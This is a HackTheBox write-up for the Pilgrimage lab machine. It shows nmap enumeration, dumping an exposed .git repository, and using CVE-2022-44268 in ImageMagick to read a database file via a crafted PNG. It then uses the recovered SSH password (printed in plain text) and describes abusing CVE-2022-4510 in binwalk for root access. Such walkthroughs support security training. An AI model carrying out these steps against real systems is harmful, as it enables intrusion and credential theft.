---
title: HackTheBox - Pilgrimage
description: Pilgrimage is an easy-difficulty Linux machine featuring a web application with an exposed `Git` repository. Analysing the underlying filesystem and source code reveals the use of a vulnerable version of `ImageMagick`, which can be used to read arbitrary files on the target by embedding a malicious `tEXT` chunk into a PNG image. The vulnerability is leveraged to obtain a `SQLite` database file containing a plaintext password that can be used to SSH into the machine. Enumeration of the running processes reveals a `Bash` script executed by `root` that calls a vulnerable version of the `Binwalk` binary. By creating another malicious PNG, `CVE-2022-4510` is leveraged to obtain Remote Code Execution (RCE) as `root`. 
date: 2023-07-24 18:40:00 +0530
categories: [HackTheBox]
tags: [hackthebox, Easy]
image:
  path: /assets/img/headers/htb_pilgrimage.webp
---



## Enumeration

Spawning the machine and adding the IP to `/etc/hosts` with hostname as `pilgrimage.htb` .

### Nmap

```console
$ sudo nmap pilgrimage.htb
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-23 11:07 EDT
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 19.64 seconds

$ sudo nmap -sV -sC -p22,80 pilgrimage.htb
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-23 11:07 EDT
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Pilgrimage - Shrink Your Images
|_http-server-header: nginx/1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.93 seconds
```

From the Nmap scan, we can see that `.git` path exists, lets use git-dumper to dump the whole repo and look for juicy files.

`$ ./git-dumper.py http://pilgrimage.htb/.git repo_name`

We have the whole repo on our storage. Some points to note are.
- After looking at `index.html` file, we can know that the web-app location on server is `/var/www/pilgrimage.htb/tmp` and there is sqlite db - `/var/db/pilgrimage`.
- The repo contains a file called **magick**. we can find out more in the terminal below.
  ```console
  $ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
  ```
- Using Searchsploit, We see that **ImageMagick 7.1.0-49** is vulnerable to **Arbitrary File Read** exploit.

```console
$ searchsploit magick 7.1.0
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
ImageMagick 7.1.0-49 - Arbitrary File Read                                                                                                | multiple/local/51261.txt
ImageMagick 7.1.0-49 - DoS                                                                                                                | php/dos/51256.txt
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results


$ searchsploit -m 51261.txt

  Exploit: ImageMagick 7.1.0-49 - Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/51261
     Path: /usr/share/exploitdb/exploits/multiple/local/51261.txt
    Codes: CVE-2022-44268
 Verified: False
File Type: ASCII text
Copied to: /home/kali/Downloads/51261.txt

$ cat 51261.txt
# Exploit Title: ImageMagick  7.1.0-49 - Arbitrary File Read
# Google Dork: N/A
# Date: 06/02/2023
# Exploit Author: Cristian 'void' Giustini
# Vendor Homepage: https://imagemagick.org/
# Software Link: https://imagemagick.org/
# Version: <= 7.1.0-49
# Tested on: 7.1.0-49 and 6.9.11-60
# CVE : CVE-2022-44268 (CVE Owner: Metabase Q Team
https://www.metabaseq.com/imagemagick-zero-days/)
# Exploit pre-requirements: Rust


# PoC : https://github.com/voidz0r/CVE-2022-44268
```

## Foothold


![pilgrimage](/assets/img/htb_pilgrimage/Pilgrimage-01.png)
> browsing to http://pilgrimage.htb/, we see upload functionality of webapp
{: .prompt-info }

Let us try to read `/var/db/pilgrimage` file using the exploit. Since the exploit is written in rust, we may need to install `cargo`.

```console
$ sudo apt install cargo
$ cargo run "/var/db/pilgrimage"
```
This will create exploit `image.png`. We will upload this file to web app to exploit the vuln. On clicking the shrink button,we will get the file output as `png`, we need to download this and extract the info.

```console
$ identify -versbose filename.png
```

From this text, we will get a ***hex*** string, which we need to convert to ascii to read the exfiltrated text. We can use `Cyberchef` to do this.

![pilgrimage](/assets/img/htb_pilgrimage/Pilgrimage-03.png)

From this conversion we get the user and password.

|  emily  |   abigchonkyboi123  |

Using these credentials, we can login to pilgrimag.htb using `ssh`. and read user.txt at `/home/emily/user.txt`.

After running `linpeas.sh` as `emily`, we see `/usr/sbin/malwarescan.sh`. We can see that this script is running frequently, with `ps aux`.

![pilgrimage](/assets/img/htb_pilgrimage/Pilgrimage-05.png)

![pilgrimage](/assets/img/htb_pilgrimage/Pilgrimage-04.png)

So, malwarescan.sh runs a vulnerable binwalk version. Below is the exploit-db page explaining the vulnerability.

[exploits/51249](https://www.exploit-db.com/exploits/51249)

Basically, we need to generate a **png** image (using above exploitation script) and place it in `/var/www/pilgrimage.htb/shrunk`, then the `malwarescan.sh` script executes the exploit (binwalk) and gets us **root** shell. using this read the **root.txt**.